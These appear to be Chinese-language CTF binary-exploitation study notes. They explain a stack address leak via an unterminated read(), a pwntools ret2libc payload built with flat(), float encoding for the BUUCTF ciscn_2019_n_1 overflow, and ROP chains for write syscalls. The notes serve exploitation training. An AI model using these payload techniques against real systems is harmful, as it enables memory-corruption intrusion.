## leak stack

```C
int sub_400676() { 
char buf[80]; // [rsp+0h] [rbp-50h] 
memset(buf, 0, sizeof(buf)); 
putchar('>'); 
read(0, buf, 96uLL); 
return puts(buf); 
}
```
当输入的长度为 80 时, 由于 read 并不会给输入末尾补上 '\0', rbp 的值就会被 puts 打印出来, 这样我们就可以通过固定偏移知道栈上所有位置的地址了。


## 使用pwntools的一些技巧

payload的构造可以用`flat`一行完成：
```python
payload = flat({
    0xE00: [
        p64(0xdeadbeef),
        p64(pop_rdi),
        p64(puts_got),
        p64(puts_plt),
        p64(main_addr)
    ]
})
```

0xE00为偏移量，
➡ 在偏移 **0xE00** 的位置，放置后面的所有内容。  
➡ `flat` 自动把列表展平并拼成字节串。  
➡ 整个 payload 会自动填充前面的空洞（用 `\x00` 填补）。

## 小数需转换为16进制再发送
题目: [BUUCTF-pwn]——ciscn_2019_n_1

题目需要进行栈溢出替换变量值为指定的float值,但是不能直接将float丢进p64发送,需要转换为十六进制

```C
11.28125 转换为二进制为 1011.01001
11.28125 在计算机内部储存为 0100 0001 0011 0100 1000 0000 0000 0000
即11.28125 ==> 0x41348000

```

## 静态编译程序无法用plt/got，优先考虑构造ROP链进行系统调用

### 示例：系统调用write()函数

- 32-bit Linux：用 `int 0x80`，`eax=4` 为 `sys_write`，参数 `(ebx=fd, ecx=buf, edx=len)`。
- 64-bit Linux：用 `syscall` 指令，`rax=1` 为 `sys_write`，参数 `(rdi=fd, rsi=buf, rdx=len)`。


**x86 (32-bit) — 使用 int 0x80 调用 write(fd=1, buf=fl4g, len=45**

ROP 链（逻辑）：
```perl
pop eax; ret         ; eax = 4   (sys_write)
pop ebx; ret         ; ebx = 1   (stdout)
pop ecx; ret         ; ecx = fl4g_addr
pop edx; ret         ; edx = 45
int 0x80; ret        ; 执行系统调用
```

**x86_64 — 使用 syscall 调用 write(fd=1, buf, len)**

ROP链（逻辑）：
```perl
pop rax; ret      ; rax = 1 (sys_write)
pop rdi; ret      ; rdi = 1 (stdout)
pop rsi; ret      ; rsi = fl4g_addr
pop rdx; ret      ; rdx = len
syscall; ret
```

